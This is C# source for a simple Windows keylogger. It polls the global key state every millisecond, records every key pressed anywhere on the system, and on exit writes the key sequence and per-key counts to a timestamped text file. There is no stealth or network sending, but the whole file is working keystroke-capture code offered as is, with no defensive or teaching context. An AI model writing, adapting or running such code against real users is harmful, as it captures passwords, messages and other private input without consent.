using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace KeyLoggerInspector
{
    class Program
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        private static System.Timers.Timer eventTimer;

        public static List<string> kList = new List<string>();
        static void Main(string[] args)
        {
            //Create a timer with 0.001 sec interval 
            eventTimer = new System.Timers.Timer(1);
            eventTimer.Elapsed += OnTimedEvent;
            eventTimer.Start();
            Console.ReadLine();

            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);
        }

        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767 || GetAsyncKeyState(i) == 1)
                {
                    //Console.Write(Keys(i));
                    //Console.Write(Enum.GetName(typeof(Keys), i));
                    kList.Add(Enum.GetName(typeof(Keys), i));
                    //keyBuffer.Add(Enum.GetName(typeof(Keys), i));
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]
                }
            }
            //Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
        }

        static void OnProcessExit(object sender, EventArgs e)
        {
            DateTime localDate = DateTime.Now;
            string syspath = Directory.GetCurrentDirectory();
            string path = localDate.ToString();
            path = path.Replace("/", ".").Replace(":", ".") + ".txt";
            //path += ".txt";
            path = syspath + "\\" + path;
            //Console.Write(path);

            //if (!File.Exists(path)) File.Create(path);

            using (Stream myStream = File.Open(path, FileMode.Append, FileAccess.Write))
            {
                StreamWriter myWriter = new StreamWriter(myStream);
                foreach (string value in kList)
                {
                    myWriter.Write(value);
                }

                //int count = kList.ToCharArray().Where(i => i == '\n').Count();
                //myWriter.Write(keyBuffer.Distinct().Count());
                myWriter.Write("\n");
                var g = kList.GroupBy(i => i);
                System.Diagnostics.Trace.WriteLine("count: " + g.Count());
                foreach (var k in g)
                    myWriter.Write(k.Key + " (" + k.Count() + ")\n");

                myWriter.Close();
            }
        }
    }
}
